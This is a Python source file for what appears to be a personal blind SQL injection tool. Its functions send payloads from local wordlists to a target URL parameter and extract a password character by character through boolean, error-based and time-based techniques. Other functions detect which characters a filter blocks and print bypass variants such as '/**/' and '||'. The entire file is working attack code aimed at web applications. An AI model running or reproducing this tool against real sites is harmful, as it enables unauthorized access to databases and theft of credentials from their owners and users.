import requests
import string
import time
char = string.printable
session = requests.Session()

# Check filter with special character
def Filter(url , header , p , list_filter):
    sp  = input("special character :")  # ex: No Hack ...
    for i in char:
       get = session.get(url = url , headers=header , params= { p : i})
       if (sp in get.text) and (len(get.text) - 1 < 100):
        print(i)
        list_filter.append(i)
    print(list_filter)

#Get Easy Payload Brute Force from cheatsheet.txt
def Get_Easy_Bf(url , header , p):
    f = open("cheatsheet.txt" , "r")   
    get = session.get(url = url , headers=header)
    len_r = len(get.text)
    print("length goc : " , len_r)
    for i in f:
        len_i = len(i)
        params = {
            p : i
        }
        get = session.get(url = url , headers=header , params=params)
        if len(get.text) - len_i != len_r:
            print(len(get.text) - len_i , i)
    f.close()

#Get boolean with payload from boolean.txt
def Get_Boolean(url , header , p):
    f1 = open("boolean.txt" , "r")
    list=[]
    num = 0        
    for ch in f1:                
        print(num , ch)
        num = num + 1
        list.append(ch)
    print("99. custom payload")           
    user_ch = int(input("your choice : "))            
    if user_ch == 99:
        pw_choose = "1." + input("payload : ")
    else:
        pw_choose = list[user_ch]
    sp = input("special: ")
    len_pw = int(input("length :"))
    password = ""
    s_p = input("Sepecial params : ")
    for i in range(1,len_pw):
        for j in char:
            pass_1 = password + j
            pw  = pw_choose.replace("{pw}",s_p).replace("{i}",str(i)).replace("{j}" , pass_1).replace("\n","")
            get = session.get(url = url , headers=header , params=f"{p}={pw}")            
            if (sp in get.text):
                print(len(get.text) , pw[2:] ,get.url)                      
                password = password + j
                print(password)
                break
    f1.close()


#Get Error-based sql with payload from error-based.txt
def Get_Error_based(url , header , p):
    f1 = open("error-based.txt", "r")
    list=[]
    num = 0        
    for ch in f1:                
        print(num , ch)
        num = num + 1
        list.append(ch)
    user_ch = int(input("your choose : "))
    sp1 = input("special appear : ")
    sp2 = input("special dissappear : ")
    len_pw = int(input("length :"))
    password = ""
    s_p = input("Sepecial params : ")
    for i in range(1, len_pw):
        for j in char:
            pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "")
            get = session.get(url=url, headers=header, params=f"{p}={pw}")
            #print( get.url , get.status_code)
            if sp1 in get.text or sp2 not in get.text:
                print(len(get.text), pw[2:], get.url)
                password = password + j
                print(password)
                break
    f1.close()

#Get Payload have filter replace
def Get_Filter(list_filter):
    print(list_filter)
    while(True):
        list_payload = []
        payload = input("Your payload : ")
        for i in list_filter:
            if i in payload:
                list_payload.append(i)
        for i in list_payload:
            if i == " ":
                #/**/, %0a, %09, %0d, (), +
                print(payload.replace(i , "%09"))
                print(payload.replace(i , "%0a"))
                print(payload.replace(i , "%0d"))
                print(payload.replace(i , "()"))
                print(payload.replace(i , "+"))
                print(payload.replace(i , "/**/"))
                break
            if i == "or":
                print(payload.replace(i , "||"))
                break
            if i not in list_payload:
                print("payload : " , payload)
                break
        break

#Get Time base with payload from time-based.txt
def Get_Time_based(url , header , p):
    f1 = open("time-based.txt", "r")
    list=[]
    num = 0        
    for ch in f1:                
        print(num , ch)
        num = num +1
        list.append(ch)
    
    user_ch = int(input("your choose : "))
    col = input("column : ")
    len_pw = int(input("length :"))
    password = ""
    s_p = input("Sepecial params : ")
    for i in range(1, len_pw):
        for j in char:
            start = time.time()
            pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "").replace("{col}" , col)
            get = session.get(url=url, headers=header, params=f"{p}={pw}")            
            timing = time.time() - start
            print(timing)
            if timing > 2:
                print(len(get.text), pw[2:], get.url)
                password = password + j
                print(password)
                break    

    f1.close()

#Numeric binary search
def binary_search(start , final, p , sp , s_p , url , user_ch , list , header):
    mid = (final + start) // 2
    print("Mid : " , mid)
    if final < start:
        return mid
    pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(mid)).replace("\n", "").replace("{quote}", "<")
    get = session.get(url=url, headers=header, params=f"{p}={pw}")
    if sp in get.text:
        return binary_search(start , mid - 1, p , sp , s_p , url , user_ch , list , header)
    else:
        return binary_search(mid + 1 , final, p , sp , s_p , url , user_ch , list , header)
#Get Numeric
def Get_Numeric(url , header , p):
    f1 = open("numeric.txt", "r")
    list=[]
    num = 0         
    for ch in f1:                
        print(num , ch)
        num = num +1
        list.append(ch)
    user_ch = int(input("your choose : "))
    s_p = input("Sepecial params : ")
    sp = input("Sepecial disappear : ")
    print("Numeric : " ,binary_search(0,100000000000000000,p, sp , s_p , url ,user_ch,list,  header))


        


